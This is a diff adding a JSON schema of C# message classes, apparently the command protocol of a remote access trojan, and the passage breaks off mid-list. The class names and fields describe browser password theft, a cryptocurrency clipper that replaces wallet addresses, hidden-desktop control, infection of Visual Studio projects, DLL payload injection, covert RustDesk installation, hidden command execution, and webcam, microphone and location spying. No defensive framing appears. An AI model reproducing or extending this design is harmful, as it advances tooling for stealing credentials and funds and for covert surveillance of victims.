@@ -1,0 +1,2390 @@
+[
+ {
+  "name": "AcctQuery",
+  "fields": [],
+  "members": [],
+  "file": "AcctQuery.cs"
+ },
+ {
+  "name": "AcctQueryArchive",
+  "fields": [
+   {
+    "type": "byte[]",
+    "name": "ArchiveData"
+   },
+   {
+    "type": "string",
+    "name": "FileName"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "AcctQueryArchive.cs"
+ },
+ {
+  "name": "AcctQueryProgress",
+  "fields": [
+   {
+    "type": "int",
+    "name": "Current"
+   },
+   {
+    "type": "int",
+    "name": "Total"
+   },
+   {
+    "type": "string",
+    "name": "BrowserName"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3
+  ],
+  "file": "AcctQueryProgress.cs"
+ },
+ {
+  "name": "AcctQueryResult",
+  "fields": [
+   {
+    "type": "string[]",
+    "name": "Passwords"
+   },
+   {
+    "type": "List<AcctRow>",
+    "name": "RecoveredAccounts"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "AcctQueryResult.cs"
+ },
+ {
+  "name": "BotKillResult",
+  "fields": [
+   {
+    "type": "string[]",
+    "name": "KilledProcesses"
+   },
+   {
+    "type": "int",
+    "name": "TotalKilled"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "BotKillResult.cs"
+ },
+ {
+  "name": "CapDirDelete",
+  "fields": [
+   {
+    "type": "string",
+    "name": "LogName"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "CapDirDelete.cs"
+ },
+ {
+  "name": "CapDirQuery",
+  "fields": [],
+  "members": [],
+  "file": "CapDirQuery.cs"
+ },
+ {
+  "name": "CapDirResult",
+  "fields": [
+   {
+    "type": "string",
+    "name": "LastLogFilePath"
+   },
+   {
+    "type": "string",
+    "name": "LogsDirectory"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "CapDirResult.cs"
+ },
+ {
+  "name": "ChatMessage",
+  "fields": [
+   {
+    "type": "string",
+    "name": "Message"
+   },
+   {
+    "type": "string",
+    "name": "Sender"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "ChatMessage.cs"
+ },
+ {
+  "name": "ClipperHit",
+  "fields": [
+   {
+    "type": "string",
+    "name": "Coin"
+   },
+   {
+    "type": "string",
+    "name": "Original"
+   },
+   {
+    "type": "string",
+    "name": "Replaced"
+   },
+   {
+    "type": "string",
+    "name": "Time"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3,
+   4
+  ],
+  "file": "ClipperHit.cs"
+ },
+ {
+  "name": "DoBotKill",
+  "fields": [],
+  "members": [],
+  "file": "DoBotKill.cs"
+ },
+ {
+  "name": "DoChangeRegistryValue",
+  "fields": [
+   {
+    "type": "string",
+    "name": "KeyPath"
+   },
+   {
+    "type": "string",
+    "name": "ValueName"
+   },
+   {
+    "type": "byte[]",
+    "name": "ValueData"
+   },
+   {
+    "type": "int",
+    "name": "ValueKind"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3,
+   4
+  ],
+  "file": "DoChangeRegistryValue.cs"
+ },
+ {
+  "name": "DoChatClose",
+  "fields": [],
+  "members": [],
+  "file": "DoChatClose.cs"
+ },
+ {
+  "name": "DoCloseConnection",
+  "fields": [
+   {
+    "type": "string",
+    "name": "LocalAddress"
+   },
+   {
+    "type": "string",
+    "name": "RemoteAddress"
+   },
+   {
+    "type": "int",
+    "name": "LocalPort"
+   },
+   {
+    "type": "int",
+    "name": "RemotePort"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3,
+   4
+  ],
+  "file": "DoCloseConnection.cs"
+ },
+ {
+  "name": "DoCreateDirectory",
+  "fields": [
+   {
+    "type": "string",
+    "name": "Path"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "DoCreateDirectory.cs"
+ },
+ {
+  "name": "DoCreateRegistryKey",
+  "fields": [
+   {
+    "type": "string",
+    "name": "ParentPath"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "DoCreateRegistryKey.cs"
+ },
+ {
+  "name": "DoCreateRegistryValue",
+  "fields": [
+   {
+    "type": "string",
+    "name": "KeyPath"
+   },
+   {
+    "type": "int",
+    "name": "Kind"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "DoCreateRegistryValue.cs"
+ },
+ {
+  "name": "DoDeleteRegistryKey",
+  "fields": [
+   {
+    "type": "string",
+    "name": "ParentPath"
+   },
+   {
+    "type": "string",
+    "name": "KeyName"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "DoDeleteRegistryKey.cs"
+ },
+ {
+  "name": "DoDeleteRegistryValue",
+  "fields": [
+   {
+    "type": "string",
+    "name": "KeyPath"
+   },
+   {
+    "type": "string",
+    "name": "ValueName"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "DoDeleteRegistryValue.cs"
+ },
+ {
+  "name": "DoDiscardFile",
+  "fields": [
+   {
+    "type": "string",
+    "name": "FileId"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "DoDiscardFile.cs"
+ },
+ {
+  "name": "DoDownloadFile",
+  "fields": [
+   {
+    "type": "string",
+    "name": "FileId"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "DoDownloadFile.cs"
+ },
+ {
+  "name": "DoDownloadFileResponse",
+  "fields": [
+   {
+    "type": "string",
+    "name": "FileName"
+   },
+   {
+    "type": "byte[]",
+    "name": "FileData"
+   },
+   {
+    "type": "bool",
+    "name": "Success"
+   },
+   {
+    "type": "string",
+    "name": "Error"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3,
+   4
+  ],
+  "file": "DoDownloadFileResponse.cs"
+ },
+ {
+  "name": "DoDrop",
+  "fields": [],
+  "members": [],
+  "file": "DoDrop.cs"
+ },
+ {
+  "name": "DoExecute",
+  "fields": [
+   {
+    "type": "string",
+    "name": "FilePath"
+   },
+   {
+    "type": "bool",
+    "name": "IsUrl"
+   },
+   {
+    "type": "bool",
+    "name": "Hidden"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3
+  ],
+  "file": "DoExecute.cs"
+ },
+ {
+  "name": "DoHVNCClipboard",
+  "fields": [
+   {
+    "type": "string",
+    "name": "Text"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "DoHVNCClipboard.cs"
+ },
+ {
+  "name": "DoHVNCKeyboard",
+  "fields": [
+   {
+    "type": "byte",
+    "name": "Key"
+   },
+   {
+    "type": "bool",
+    "name": "KeyDown"
+   },
+   {
+    "type": "bool",
+    "name": "Shift"
+   },
+   {
+    "type": "bool",
+    "name": "Control"
+   },
+   {
+    "type": "bool",
+    "name": "Alt"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3,
+   4,
+   5
+  ],
+  "file": "DoHVNCKeyboard.cs"
+ },
+ {
+  "name": "DoHVNCProcess",
+  "fields": [
+   {
+    "type": "string",
+    "name": "ProcessName"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "DoHVNCProcess.cs"
+ },
+ {
+  "name": "DoHVNCZOrder",
+  "fields": [
+   {
+    "type": "bool",
+    "name": "Enable"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "DoHVNCZOrder.cs"
+ },
+ {
+  "name": "DoHiddenRustDeskAction",
+  "fields": [
+   {
+    "type": "int",
+    "name": "Action"
+   },
+   {
+    "type": "string",
+    "name": "NewPassword"
+   },
+   {
+    "type": "string",
+    "name": "CustomServer"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3
+  ],
+  "file": "DoHiddenRustDeskAction.cs"
+ },
+ {
+  "name": "DoHiddenRustDeskActionResponse",
+  "fields": [
+   {
+    "type": "bool",
+    "name": "Success"
+   },
+   {
+    "type": "string",
+    "name": "Message"
+   },
+   {
+    "type": "string",
+    "name": "RustDeskId"
+   },
+   {
+    "type": "string",
+    "name": "Password"
+   },
+   {
+    "type": "bool",
+    "name": "IsInstalled"
+   },
+   {
+    "type": "bool",
+    "name": "IsRunning"
+   },
+   {
+    "type": "string",
+    "name": "Version"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3,
+   4,
+   5,
+   6,
+   7
+  ],
+  "file": "DoHiddenRustDeskActionResponse.cs"
+ },
+ {
+  "name": "DoKeyboardEvent",
+  "fields": [
+   {
+    "type": "byte",
+    "name": "Key"
+   },
+   {
+    "type": "bool",
+    "name": "KeyDown"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "DoKeyboardEvent.cs"
+ },
+ {
+  "name": "DoLift",
+  "fields": [],
+  "members": [],
+  "file": "DoLift.cs"
+ },
+ {
+  "name": "DoLoadRegistryKey",
+  "fields": [
+   {
+    "type": "string",
+    "name": "RootKeyName"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "DoLoadRegistryKey.cs"
+ },
+ {
+  "name": "DoMask",
+  "fields": [
+   {
+    "type": "byte[]",
+    "name": "DllPayload"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "DoMask.cs"
+ },
+ {
+  "name": "DoMouseEvent",
+  "fields": [
+   {
+    "type": "int",
+    "name": "Action"
+   },
+   {
+    "type": "bool",
+    "name": "IsMouseDown"
+   },
+   {
+    "type": "int",
+    "name": "X"
+   },
+   {
+    "type": "int",
+    "name": "Y"
+   },
+   {
+    "type": "int",
+    "name": "MonitorIndex"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3,
+   4,
+   5
+  ],
+  "file": "DoMouseEvent.cs"
+ },
+ {
+  "name": "DoOpenChat",
+  "fields": [
+   {
+    "type": "string",
+    "name": "Title"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "DoOpenChat.cs"
+ },
+ {
+  "name": "DoPathDelete",
+  "fields": [
+   {
+    "type": "string",
+    "name": "Path"
+   },
+   {
+    "type": "int",
+    "name": "PathType"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "DoPathDelete.cs"
+ },
+ {
+  "name": "DoPathRename",
+  "fields": [
+   {
+    "type": "string",
+    "name": "Path"
+   },
+   {
+    "type": "string",
+    "name": "NewPath"
+   },
+   {
+    "type": "int",
+    "name": "PathType"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3
+  ],
+  "file": "DoPathRename.cs"
+ },
+ {
+  "name": "DoPlayAudio",
+  "fields": [
+   {
+    "type": "string",
+    "name": "Url"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "DoPlayAudio.cs"
+ },
+ {
+  "name": "DoPlayTTS",
+  "fields": [
+   {
+    "type": "string",
+    "name": "Text"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "DoPlayTTS.cs"
+ },
+ {
+  "name": "DoProcessEnd",
+  "fields": [
+   {
+    "type": "int",
+    "name": "Pid"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "DoProcessEnd.cs"
+ },
+ {
+  "name": "DoProcessResponse",
+  "fields": [
+   {
+    "type": "int",
+    "name": "Action"
+   },
+   {
+    "type": "bool",
+    "name": "Result"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "DoProcessResponse.cs"
+ },
+ {
+  "name": "DoProcessStart",
+  "fields": [
+   {
+    "type": "string",
+    "name": "DownloadUrl"
+   },
+   {
+    "type": "string",
+    "name": "FilePath"
+   },
+   {
+    "type": "bool",
+    "name": "IsUpdate"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3
+  ],
+  "file": "DoProcessStart.cs"
+ },
+ {
+  "name": "DoPurge",
+  "fields": [],
+  "members": [],
+  "file": "DoPurge.cs"
+ },
+ {
+  "name": "DoRenameRegistryKey",
+  "fields": [
+   {
+    "type": "string",
+    "name": "ParentPath"
+   },
+   {
+    "type": "string",
+    "name": "OldKeyName"
+   },
+   {
+    "type": "string",
+    "name": "NewKeyName"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3
+  ],
+  "file": "DoRenameRegistryKey.cs"
+ },
+ {
+  "name": "DoRenameRegistryValue",
+  "fields": [
+   {
+    "type": "string",
+    "name": "KeyPath"
+   },
+   {
+    "type": "string",
+    "name": "OldValueName"
+   },
+   {
+    "type": "string",
+    "name": "NewValueName"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3
+  ],
+  "file": "DoRenameRegistryValue.cs"
+ },
+ {
+  "name": "DoRestoreFile",
+  "fields": [
+   {
+    "type": "string",
+    "name": "FileId"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "DoRestoreFile.cs"
+ },
+ {
+  "name": "DoRestoreFileResponse",
+  "fields": [
+   {
+    "type": "bool",
+    "name": "Success"
+   },
+   {
+    "type": "string",
+    "name": "Message"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "DoRestoreFileResponse.cs"
+ },
+ {
+  "name": "DoRetry",
+  "fields": [],
+  "members": [],
+  "file": "DoRetry.cs"
+ },
+ {
+  "name": "DoRunCommand",
+  "fields": [
+   {
+    "type": "string",
+    "name": "Command"
+   },
+   {
+    "type": "bool",
+    "name": "Hidden"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "DoRunCommand.cs"
+ },
+ {
+  "name": "DoShellExecute",
+  "fields": [
+   {
+    "type": "string",
+    "name": "Command"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "DoShellExecute.cs"
+ },
+ {
+  "name": "DoShellExecuteResponse",
+  "fields": [
+   {
+    "type": "string",
+    "name": "Output"
+   },
+   {
+    "type": "bool",
+    "name": "IsError"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "DoShellExecuteResponse.cs"
+ },
+ {
+  "name": "DoShowMessageBox",
+  "fields": [
+   {
+    "type": "string",
+    "name": "Caption"
+   },
+   {
+    "type": "string",
+    "name": "Text"
+   },
+   {
+    "type": "string",
+    "name": "Button"
+   },
+   {
+    "type": "string",
+    "name": "Icon"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3,
+   4
+  ],
+  "file": "DoShowMessageBox.cs"
+ },
+ {
+  "name": "DoShutdownAction",
+  "fields": [
+   {
+    "type": "int",
+    "name": "Action"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "DoShutdownAction.cs"
+ },
+ {
+  "name": "DoStartClipper",
+  "fields": [
+   {
+    "type": "string",
+    "name": "BtcAddress"
+   },
+   {
+    "type": "string",
+    "name": "EthAddress"
+   },
+   {
+    "type": "string",
+    "name": "LtcAddress"
+   },
+   {
+    "type": "string",
+    "name": "XmrAddress"
+   },
+   {
+    "type": "string",
+    "name": "SolAddress"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3,
+   4,
+   5
+  ],
+  "file": "DoStartClipper.cs"
+ },
+ {
+  "name": "DoStartupItemAdd",
+  "fields": [
+   {
+    "type": "string",
+    "name": "Name"
+   },
+   {
+    "type": "string",
+    "name": "Path"
+   },
+   {
+    "type": "int",
+    "name": "Type"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3
+  ],
+  "file": "DoStartupItemAdd.cs"
+ },
+ {
+  "name": "DoStartupItemRemove",
+  "fields": [
+   {
+    "type": "string",
+    "name": "Name"
+   },
+   {
+    "type": "string",
+    "name": "Path"
+   },
+   {
+    "type": "int",
+    "name": "Type"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3
+  ],
+  "file": "DoStartupItemRemove.cs"
+ },
+ {
+  "name": "DoStopAudio",
+  "fields": [],
+  "members": [],
+  "file": "DoStopAudio.cs"
+ },
+ {
+  "name": "DoStopClipper",
+  "fields": [],
+  "members": [],
+  "file": "DoStopClipper.cs"
+ },
+ {
+  "name": "DoVSInfect",
+  "fields": [
+   {
+    "type": "string",
+    "name": "Payload"
+   },
+   {
+    "type": "bool",
+    "name": "InfectAll"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "DoVSInfect.cs"
+ },
+ {
+  "name": "DoVisitWebsite",
+  "fields": [
+   {
+    "type": "string",
+    "name": "Url"
+   },
+   {
+    "type": "bool",
+    "name": "Hidden"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "DoVisitWebsite.cs"
+ },
+ {
+  "name": "DoWebcamStop",
+  "fields": [],
+  "members": [],
+  "file": "DoWebcamStop.cs"
+ },
+ {
+  "name": "ExtPush",
+  "fields": [
+   {
+    "type": "string",
+    "name": "PluginName"
+   },
+   {
+    "type": "byte[]",
+    "name": "PluginData"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "ExtPush.cs"
+ },
+ {
+  "name": "ExtPushAck",
+  "fields": [
+   {
+    "type": "string",
+    "name": "PluginName"
+   },
+   {
+    "type": "bool",
+    "name": "Success"
+   },
+   {
+    "type": "string",
+    "name": "ErrorMessage"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3
+  ],
+  "file": "ExtPushAck.cs"
+ },
+ {
+  "name": "FileTransferCancel",
+  "fields": [
+   {
+    "type": "int",
+    "name": "Id"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "FileTransferCancel.cs"
+ },
+ {
+  "name": "FileTransferChunk",
+  "fields": [
+   {
+    "type": "int",
+    "name": "Id"
+   },
+   {
+    "type": "string",
+    "name": "FilePath"
+   },
+   {
+    "type": "long",
+    "name": "FileSize"
+   },
+   {
+    "type": "byte[]",
+    "name": "Chunk"
+   },
+   {
+    "type": "int",
+    "name": "ChunkSize"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3,
+   4,
+   5
+  ],
+  "file": "FileTransferChunk.cs"
+ },
+ {
+  "name": "FileTransferComplete",
+  "fields": [
+   {
+    "type": "int",
+    "name": "Id"
+   },
+   {
+    "type": "string",
+    "name": "FilePath"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "FileTransferComplete.cs"
+ },
+ {
+  "name": "FileTransferRequest",
+  "fields": [
+   {
+    "type": "int",
+    "name": "Id"
+   },
+   {
+    "type": "string",
+    "name": "RemotePath"
+   },
+   {
+    "type": "int",
+    "name": "Type"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3
+  ],
+  "file": "FileTransferRequest.cs"
+ },
+ {
+  "name": "GeoLocationResult",
+  "fields": [
+   {
+    "type": "double",
+    "name": "Latitude"
+   },
+   {
+    "type": "double",
+    "name": "Longitude"
+   },
+   {
+    "type": "double",
+    "name": "Accuracy"
+   },
+   {
+    "type": "double",
+    "name": "Altitude"
+   },
+   {
+    "type": "bool",
+    "name": "Success"
+   },
+   {
+    "type": "string",
+    "name": "Error"
+   },
+   {
+    "type": "string",
+    "name": "Source"
+   },
+   {
+    "type": "double",
+    "name": "Speed"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3,
+   4,
+   5,
+   6,
+   7,
+   8
+  ],
+  "file": "GeoLocationResult.cs"
+ },
+ {
+  "name": "GetAvailableMicrophones",
+  "fields": [],
+  "members": [],
+  "file": "GetAvailableMicrophones.cs"
+ },
+ {
+  "name": "GetAvailableMicrophonesResponse",
+  "fields": [
+   {
+    "type": "string[]",
+    "name": "Devices"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "GetAvailableMicrophonesResponse.cs"
+ },
+ {
+  "name": "GetAvailableWebcams",
+  "fields": [],
+  "members": [],
+  "file": "GetAvailableWebcams.cs"
+ },
+ {
+  "name": "GetAvailableWebcamsResponse",
+  "fields": [
+   {
+    "type": "string[]",
+    "name": "Webcams"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "GetAvailableWebcamsResponse.cs"
+ },
+ {
+  "name": "GetChangeRegistryValueResponse",
+  "fields": [
+   {
+    "type": "string",
+    "name": "KeyPath"
+   },
+   {
+    "type": "string",
+    "name": "ValueName"
+   },
+   {
+    "type": "byte[]",
+    "name": "ValueData"
+   },
+   {
+    "type": "int",
+    "name": "ValueKind"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3,
+   4
+  ],
+  "file": "GetChangeRegistryValueResponse.cs"
+ },
+ {
+  "name": "GetClipboard",
+  "fields": [],
+  "members": [],
+  "file": "GetClipboard.cs"
+ },
+ {
+  "name": "GetClipboardResponse",
+  "fields": [
+   {
+    "type": "string",
+    "name": "Content"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "GetClipboardResponse.cs"
+ },
+ {
+  "name": "GetConnections",
+  "fields": [],
+  "members": [],
+  "file": "GetConnections.cs"
+ },
+ {
+  "name": "GetConnectionsResponse",
+  "fields": [
+   {
+    "type": "string[]",
+    "name": "LocalAddresses"
+   },
+   {
+    "type": "string[]",
+    "name": "LocalPorts"
+   },
+   {
+    "type": "string[]",
+    "name": "RemoteAddresses"
+   },
+   {
+    "type": "string[]",
+    "name": "RemotePorts"
+   },
+   {
+    "type": "string[]",
+    "name": "States"
+   },
+   {
+    "type": "int[]",
+    "name": "Pids"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3,
+   4,
+   5,
+   6
+  ],
+  "file": "GetConnectionsResponse.cs"
+ },
+ {
+  "name": "GetCreateRegistryKeyResponse",
+  "fields": [
+   {
+    "type": "string",
+    "name": "ParentPath"
+   },
+   {
+    "type": "string",
+    "name": "KeyName"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "GetCreateRegistryKeyResponse.cs"
+ },
+ {
+  "name": "GetCreateRegistryValueResponse",
+  "fields": [
+   {
+    "type": "string",
+    "name": "KeyPath"
+   },
+   {
+    "type": "string",
+    "name": "ValueName"
+   },
+   {
+    "type": "int",
+    "name": "ValueKind"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3
+  ],
+  "file": "GetCreateRegistryValueResponse.cs"
+ },
+ {
+  "name": "GetDeleteRegistryKeyResponse",
+  "fields": [
+   {
+    "type": "string",
+    "name": "ParentPath"
+   },
+   {
+    "type": "string",
+    "name": "KeyName"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "GetDeleteRegistryKeyResponse.cs"
+ },
+ {
+  "name": "GetDeleteRegistryValueResponse",
+  "fields": [
+   {
+    "type": "string",
+    "name": "KeyPath"
+   },
+   {
+    "type": "string",
+    "name": "ValueName"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "GetDeleteRegistryValueResponse.cs"
+ },
+ {
+  "name": "GetDeletedFiles",
+  "fields": [],
+  "members": [],
+  "file": "GetDeletedFiles.cs"
+ },
+ {
+  "name": "GetDeletedFilesResponse",
+  "fields": [
+   {
+    "type": "string[]",
+    "name": "Names"
+   },
+   {
+    "type": "string[]",
+    "name": "Folders"
+   },
+   {
+    "type": "long[]",
+    "name": "Sizes"
+   },
+   {
+    "type": "string[]",
+    "name": "DeletedAt"
+   },
+   {
+    "type": "string[]",
+    "name": "Sources"
+   },
+   {
+    "type": "string[]",
+    "name": "Ids"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3,
+   4,
+   5,
+   6
+  ],
+  "file": "GetDeletedFilesResponse.cs"
+ },
+ {
+  "name": "GetDesktop",
+  "fields": [
+   {
+    "type": "int",
+    "name": "Quality"
+   },
+   {
+    "type": "int",
+    "name": "Monitor"
+   },
+   {
+    "type": "bool",
+    "name": "CreateRecovery"
+   },
+   {
+    "type": "bool",
+    "name": "Destroy"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3,
+   4
+  ],
+  "file": "GetDesktop.cs"
+ },
+ {
+  "name": "GetDesktopAudio",
+  "fields": [
+   {
+    "type": "bool",
+    "name": "Start"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "GetDesktopAudio.cs"
+ },
+ {
+  "name": "GetDesktopAudioResponse",
+  "fields": [
+   {
+    "type": "byte[]",
+    "name": "Audio"
+   },
+   {
+    "type": "int",
+    "name": "SampleRate"
+   },
+   {
+    "type": "int",
+    "name": "Channels"
+   },
+   {
+    "type": "int",
+    "name": "BitsPerSample"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3,
+   4
+  ],
+  "file": "GetDesktopAudioResponse.cs"
+ },
+ {
+  "name": "GetDesktopResponse",
+  "fields": [
+   {
+    "type": "byte[]",
+    "name": "Image"
+   },
+   {
+    "type": "int",
+    "name": "Quality"
+   },
+   {
+    "type": "int",
+    "name": "Monitor"
+   },
+   {
+    "type": "int",
+    "name": "X"
+   },
+   {
+    "type": "int",
+    "name": "Y"
+   },
+   {
+    "type": "int",
+    "name": "Width"
+   },
+   {
+    "type": "int",
+    "name": "Height"
+   },
+   {
+    "type": "bool",
+    "name": "IsDelta"
+   },
+   {
+    "type": "string",
+    "name": "Format"
+   },
+   {
+    "type": "bool",
+    "name": "IsKeyframe"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3,
+   4,
+   5,
+   6,
+   7,
+   8,
+   9,
+   10
+  ],
+  "file": "GetDesktopResponse.cs"
+ },
+ {
+  "name": "GetDirectory",
+  "fields": [
+   {
+    "type": "string",
+    "name": "RemotePath"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "GetDirectory.cs"
+ },
+ {
+  "name": "GetDirectoryResponse",
+  "fields": [
+   {
+    "type": "string",
+    "name": "RemotePath"
+   },
+   {
+    "type": "string[]",
+    "name": "Folders"
+   },
+   {
+    "type": "string[]",
+    "name": "Files"
+   },
+   {
+    "type": "long[]",
+    "name": "FileSizes"
+   },
+   {
+    "type": "DateTime[]",
+    "name": "LastModificationDates"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3,
+   4,
+   5
+  ],
+  "file": "GetDirectoryResponse.cs"
+ },
+ {
+  "name": "GetDrives",
+  "fields": [],
+  "members": [],
+  "file": "GetDrives.cs"
+ },
+ {
+  "name": "GetDrivesResponse",
+  "fields": [
+   {
+    "type": "string[]",
+    "name": "DriveDisplayNames"
+   },
+   {
+    "type": "string[]",
+    "name": "RootDirectories"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "GetDrivesResponse.cs"
+ },
+ {
+  "name": "GetHVNCDesktop",
+  "fields": [
+   {
+    "type": "int",
+    "name": "Quality"
+   },
+   {
+    "type": "int",
+    "name": "Monitor"
+   },
+   {
+    "type": "bool",
+    "name": "StartStream"
+   },
+   {
+    "type": "bool",
+    "name": "Destroy"
+   },
+   {
+    "type": "int",
+    "name": "Mode"
+   },
+   {
+    "type": "int",
+    "name": "MaxWidth"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3,
+   4,
+   5,
+   6
+  ],
+  "file": "GetHVNCDesktop.cs"
+ },
+ {
+  "name": "GetMicrophone",
+  "fields": [
+   {
+    "type": "int",
+    "name": "DeviceIndex"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "GetMicrophone.cs"
+ },
+ {
+  "name": "GetMicrophoneResponse",
+  "fields": [
+   {
+    "type": "byte[]",
+    "name": "Audio"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "GetMicrophoneResponse.cs"
+ },
+ {
+  "name": "GetMonitors",
+  "fields": [],
+  "members": [],
+  "file": "GetMonitors.cs"
+ },
+ {
+  "name": "GetMonitorsResponse",
+  "fields": [
+   {
+    "type": "int",
+    "name": "Number"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "GetMonitorsResponse.cs"
+ },
+ {
+  "name": "GetProcesses",
+  "fields": [],
+  "members": [],
+  "file": "GetProcesses.cs"
+ },
+ {
+  "name": "GetProcessesResponse",
+  "fields": [
+   {
+    "type": "string[]",
+    "name": "Processes"
+   },
+   {
+    "type": "int[]",
+    "name": "Ids"
+   },
+   {
+    "type": "string[]",
+    "name": "Titles"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3
+  ],
+  "file": "GetProcessesResponse.cs"
+ },
+ {
+  "name": "GetRegistryKeysResponse",
+  "fields": [
+   {
+    "type": "string",
+    "name": "RootKey"
+   },
+   {
+    "type": "string[]",
+    "name": "Matches"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "GetRegistryKeysResponse.cs"
+ },
+ {
+  "name": "GetRenameRegistryKeyResponse",
+  "fields": [
+   {
+    "type": "string",
+    "name": "ParentPath"
+   },
+   {
+    "type": "string",
+    "name": "OldKeyName"
+   },
+   {
+    "type": "string",
+    "name": "NewKeyName"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3
+  ],
+  "file": "GetRenameRegistryKeyResponse.cs"
+ },
+ {
+  "name": "GetRenameRegistryValueResponse",
+  "fields": [
+   {
+    "type": "string",
+    "name": "KeyPath"
+   },
+   {
+    "type": "string",
+    "name": "OldValueName"
+   },
+   {
+    "type": "string",
+    "name": "NewValueName"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3
+  ],
+  "file": "GetRenameRegistryValueResponse.cs"
+ },
+ {
+  "name": "GetStartupItems",
+  "fields": [],
+  "members": [],
+  "file": "GetStartupItems.cs"
+ },
+ {
+  "name": "GetStartupItemsResponse",
+  "fields": [
+   {
+    "type": "string[]",
+    "name": "StartupItems"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "GetStartupItemsResponse.cs"
+ },
+ {
+  "name": "GetSystemInfo",
+  "fields": [],
+  "members": [],
+  "file": "GetSystemInfo.cs"
+ },
+ {
+  "name": "GetSystemInfoResponse",
+  "fields": [
+   {
+    "type": "string[]",
+    "name": "SystemInfos"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "GetSystemInfoResponse.cs"
+ },
+ {
+  "name": "GetWebcam",
+  "fields": [
+   {
+    "type": "int",
+    "name": "Webcam"
+   },
+   {
+    "type": "int",
+    "name": "Quality"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "GetWebcam.cs"
+ },
+ {
+  "name": "GetWebcamResponse",
+  "fields": [
+   {
+    "type": "byte[]",
+    "name": "Image"
+   },
+   {
+    "type": "int",
+    "name": "Webcam"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "GetWebcamResponse.cs"
+ },
+ {
